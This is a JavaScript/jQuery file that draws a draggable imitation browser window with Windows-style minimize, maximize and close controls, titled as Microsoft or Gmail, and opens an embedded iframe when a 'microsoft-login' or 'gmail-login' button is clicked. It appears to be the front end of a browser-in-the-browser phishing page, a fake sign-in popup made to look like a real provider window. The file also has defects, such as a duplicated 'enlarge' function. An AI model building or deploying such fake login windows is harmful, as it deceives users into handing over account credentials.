//Microsoft
var minimize = document.getElementById("minimize");
var square = document.getElementById("square");
var exit = document.getElementById("exit");
var titleBar = document.getElementById("title-bar");

//Google
var minimizes = document.getElementById("minimizes");
var squares = document.getElementById("squares");
var exits = document.getElementById("exits");
var titleBars = document.getElementById("deneme");

////////////////// Hover listeners //////////////////
minimize.addEventListener('mouseover', function handleMouseOver() {
  minimize.style.backgroundColor = 'rgba(0, 0, 0, 0.09765625)';
  minimize.style.cursor = 'context-menu';
});

minimize.addEventListener('mouseout', function handleMouseOut() {
  minimize.style.backgroundColor = '#d6dae0';
  minimize.style.cursor = 'default';
});

square.addEventListener('mouseover', function handleMouseOver() {
  square.style.backgroundColor = 'rgba(0, 0, 0, 0.09765625)';
  square.style.cursor = 'context-menu';
});

square.addEventListener('mouseout', function handleMouseOut() {
  square.style.backgroundColor = '#d6dae0';
  square.style.cursor = 'default';
});

exit.addEventListener('mouseover', function handleMouseOver() {
  exit.style.backgroundColor = '#E81123';
  exit.style.cursor = 'context-menu';
});

exit.addEventListener('mouseout', function handleMouseOut() {
  exit.style.backgroundColor = '#d6dae0';
  exit.style.cursor = 'default';
});

titleBar.addEventListener('mouseover', function handleMouseOver() {
  titleBar.style.cursor = 'context-menu';
});

titleBar.addEventListener('mouseout', function handleMouseOver() {
  titleBar.style.cursor = 'default';
});

minimizes.addEventListener('mouseover', function handleMouseOver() {
  minimizes.style.backgroundColor = 'rgba(0, 0, 0, 0.09765625)';
  minimizes.style.cursor = 'context-menu';
});

minimizes.addEventListener('mouseout', function handleMouseOut() {
  minimizes.style.backgroundColor = '#d6dae0';
  minimizes.style.cursor = 'default';
});

squares.addEventListener('mouseover', function handleMouseOver() {
  squares.style.backgroundColor = 'rgba(0, 0, 0, 0.09765625)';
  squares.style.cursor = 'context-menu';
});

squares.addEventListener('mouseout', function handleMouseOut() {
  squares.style.backgroundColor = '#d6dae0';
  squares.style.cursor = 'default';
});

exits.addEventListener('mouseover', function handleMouseOver() {
  exits.style.backgroundColor = '#E81123';
  exits.style.cursor = 'context-menu';
});

exits.addEventListener('mouseout', function handleMouseOut() {
  exits.style.backgroundColor = '#d6dae0';
  exits.style.cursor = 'default';
});


titleBars.addEventListener('mouseover', function handleMouseOver() {
  titleBars.style.cursor = 'context-menu';
});

titleBars.addEventListener('mouseout', function handleMouseOver() {
  titleBars.style.cursor = 'default';
});


//////////////// Make window draggable start ////////////////
// Make the DIV element draggable:
var draggable = $('.window');
var title = $('#title-bar');


title.on('mousedown', function(e){
	var dr = $(draggable).addClass("drag");
	height = dr.outerHeight();
	width = dr.outerWidth();
	ypos = dr.offset().top + height - e.pageY,
	xpos = dr.offset().left + width - e.pageX;
	$(document.body).on('mousemove', function(e){
		var itop = e.pageY + ypos - height;
		var ileft = e.pageX + xpos - width;
		if(dr.hasClass("drag")){
			dr.offset({top: itop,left: ileft});
		}
	}).on('mouseup', function(e){
			dr.removeClass("drag");
	});
});


var titles = $('#deneme');


titles.on('mousedown', function(e){
	var dr = $(draggable).addClass("drag");
	height = dr.outerHeight();
	width = dr.outerWidth();
	ypos = dr.offset().top + height - e.pageY,
	xpos = dr.offset().left + width - e.pageX;
	$(document.body).on('mousemove', function(e){
		var itop = e.pageY + ypos - height;
		var ileft = e.pageX + xpos - width;
		if(dr.hasClass("drag")){
			dr.offset({top: itop,left: ileft});
		}
	}).on('mouseup', function(e){
			dr.removeClass("drag");
	});
});
//////////////// Make window draggable end ////////////////


////////////////// Onclick listeners //////////////////
// X button functionality
$("#exit").click(function(){
    $(".window").css("display", "none");
    $("#Microsoft").css("display", "none");
    $("#Gmails").css("display", "none");
    $("#m-title").css("display", "none");
    $("#g-title").css("display", "none");
  });

// Maximize button functionality
$("#square").click(enlarge);

function enlarge(){
  if(square.classList.contains("enlarged")){
    $(".window").css("width", "40%");
    $("#title-bar-width").css('width', '100%');
    $(".content").css("width", "100%");
    $("#square").removeClass("enlarged");
  }
  else{
    $(".window").css("width", "70%");
    $("#title-bar-width").css('width', '100%');
    $(".content").css("width", "100%");
    $("#square").addClass("enlarged");
  }
}

$("#exits").click(function(){
  $(".window").css("display", "none");
  $("#Microsoft").css("display", "none");
  $("#Gmails").css("display", "none");
  $("#m-title").css("display", "none");
  $("#g-title").css("display", "none");
});

// Maximize button functionality
$("#squares").click(enlarge);

function enlarge(){
if(squares.classList.contains("enlarged")){
  $(".window").css("width", "40%");
  $("#title-bar-width").css('width', '100%');
  $(".content").css("width", "100%");
  $("#squares").removeClass("enlarged");
}
else{
  $(".window").css("width", "70%");
  $("#title-bar-width").css('width', '100%');
  $(".content").css("width", "100%");
  $("#squares").addClass("enlarged");
}
}




document.getElementById('microsoft-login').addEventListener('click', function() {
  // Set the iframe source when the button is clicked

  document.getElementById('microsoft').style.display = "block"; // Show iframe
  document.getElementById('m-title').style.display = "block"; // Show iframe
  document.getElementById('Microsoft').style.display = "block"; // Show iframe


  document.getElementById('g-title').style.display = "none"; // Show iframe
  document.getElementById('Gmail').style.display = "none"; // Show iframe

});

document.getElementById('gmail-login').addEventListener('click', function() {
  // Set the iframe source when the button is clicked
  document.getElementById('microsoft').style.display = "block"; // Show iframe
  document.getElementById('g-title').style.display = "block"; // Show iframe
  document.getElementById('Gmail').style.display = "block"; // Show iframe

  document.getElementById('m-title').style.display = "none"; // Show iframe
  document.getElementById('Microsoft').style.display = "none"; // Show iframe
});

window.addEventListener("message", function(event) {
  if (event.data === "closeIframe") {
      document.getElementById("microsoft").style.display = "none";
      document.getElementById('m-title').style.display = "none"; // Show iframe
      document.getElementById('Microsoft').style.display = "none"; // Show iframe
      document.getElementById('g-title').style.display = "none"; // Show iframe
      document.getElementById('Gmail').style.display = "none"; // Show iframe
  }
}, false);
